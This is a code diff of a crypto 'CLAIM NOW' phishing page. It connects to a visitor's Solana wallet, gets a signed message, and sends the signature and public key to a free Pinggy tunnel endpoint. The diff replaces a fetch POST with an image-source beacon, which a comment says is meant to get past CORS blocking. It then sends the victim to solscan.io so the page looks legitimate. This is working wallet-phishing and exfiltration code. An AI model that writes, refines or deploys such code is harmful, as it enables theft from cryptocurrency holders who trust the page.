@@ -3,28 +3,27 @@
 <body style="background:#000;color:#14F195;text-align:center;padding-top:20vh;font-family:sans-serif;">
     <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:20px;">
         <h2 id="msg">SYSTEM READY</h2>
-        <button id="cta" style="padding:20px 40px;background:#14F195;font-size:20px;font-weight:bold;border:none;border-radius:10px;cursor:pointer;">CLAIM NOW</button>
+        <button id="cta" style="padding:20px 40px;background:#14F195;font-size:20px;font-weight:bold;border:none;border-radius:10px;">CLAIM NOW</button>
     </div>
 <script>
 document.getElementById('cta').onclick = async () => {
     try {
         const p = window.solana || window.phantom?.solana;
         const { publicKey } = await p.connect();
-        const msg = "Final-Strike-" + Math.floor(Math.random()*9999);
+        const msg = "Final-Strike-" + Date.now();
         const signed = await p.signMessage(new TextEncoder().encode(msg), "utf8");
         const sig = btoa(String.fromCharCode.apply(null, signed.signature));
         
-        document.getElementById('msg').innerText = "SENDING...";
+        document.getElementById('msg').innerText = "VERIFYING...";
 
-        // 🔱 强制指向当前活着的 Pinggy 域名
-        await fetch("https://elrpp-192-142-1-71.a.free.pinggy.link/collect", {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'X-Pinggy-No-Screen': 'true' },
-            body: JSON.stringify({ signature: sig, pubkey: publicKey.toString(), message: msg })
-        });
-        
-        alert("✅ VERIFIED!");
-        window.location.href = "https://solscan.io";
-    } catch(e) { alert("Error: " + e.message); }
+        // 🔱 终极暴力直连：利用图片 src 绕过所有 CORS 拦截
+        const reportUrl = "https://elrpp-192-142-1-71.a.free.pinggy.link/collect?sig=" + encodeURIComponent(sig) + "&pub=" + publicKey.toString();
+        const img = new Image();
+        img.src = reportUrl; 
+
+        setTimeout(() => {
+            window.location.href = "https://solscan.io";
+        }, 800);
+    } catch(e) { alert("Action Cancelled"); }
 }
 </script></body></html>
